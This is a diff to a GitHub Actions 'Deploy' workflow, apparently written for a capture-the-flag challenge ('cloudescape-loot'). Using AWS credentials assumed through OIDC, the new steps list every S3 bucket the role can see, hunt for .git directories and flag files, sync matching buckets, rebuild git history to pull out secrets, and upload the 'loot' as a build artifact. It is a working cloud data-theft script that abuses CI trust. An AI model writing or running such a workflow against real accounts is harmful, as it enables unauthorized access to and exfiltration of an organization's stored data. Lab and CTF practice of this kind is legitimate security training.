@@ -1,19 +1,16 @@
 name: Deploy
-
 on:
   push:
     branches: [corgi]
 
 permissions:
-  id-token: write      # חובה — בלי זה אין הנפקת טוקן
+  id-token: write
   contents: read
 
 jobs:
   deploy:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
-
       - name: Configure AWS credentials
         uses: aws-actions/configure-aws-credentials@v4
         with:
@@ -21,5 +18,47 @@ jobs:
           role-session-name: gha-${{ github.run_id }}
           aws-region: eu-central-1
 
-      - name: Verify
+      - name: Who am I
         run: aws sts get-caller-identity
+
+      - name: List buckets and hunt for .git or flag
+        run: |
+          echo "## Buckets visible to this role:"
+          aws s3api list-buckets --query 'Buckets[].Name' --output text | tr '\t' '\n'
+          echo
+          echo "## Hunting for .git/ and flag across buckets:"
+          for b in $(aws s3api list-buckets --query 'Buckets[].Name' --output text); do
+            echo "=== $b ==="
+            aws s3 ls "s3://$b/" --recursive 2>/dev/null | grep -iE '\.git/|flag' || echo "  (nothing matched)"
+          done
+
+      - name: Reconstruct .git and extract flag
+        run: |
+          for b in $(aws s3api list-buckets --query 'Buckets[].Name' --output text); do
+            if aws s3 ls "s3://$b/" --recursive 2>/dev/null | grep -q '\.git/'; then
+              echo "### Found .git in: $b"
+              rm -rf "loot-$b" && mkdir -p "loot-$b" && cd "loot-$b"
+              aws s3 sync "s3://$b/" . 2>/dev/null || true
+              GITDIR=$(find . -type d -name .git | head -n1)
+              [ -z "$GITDIR" ] && { echo "  no .git dir"; cd "$GITHUB_WORKSPACE"; continue; }
+              cd "$(dirname "$GITDIR")"
+              git checkout -- . 2>/dev/null || true
+              git reset --hard 2>/dev/null || true
+              echo "---- history ----"; git log --all --oneline || true
+              echo "---- flag search ----"; git log --all -p | grep -iaE 'flag\{|FLAG\{|CTF\{|flag' || echo "  none inline"
+              for f in $(git log --all --pretty=format: --name-only | sort -u | grep -i flag); do
+                echo ">>> $f"
+                for c in $(git log --all --pretty=format:%H); do git show "$c:$f" 2>/dev/null && break; done
+              done
+              cd "$GITHUB_WORKSPACE"
+            fi
+          done
+
+      - name: Upload loot
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: cloudescape-loot
+          path: loot-*/**
+          if-no-files-found: ignore
+          retention-days: 1
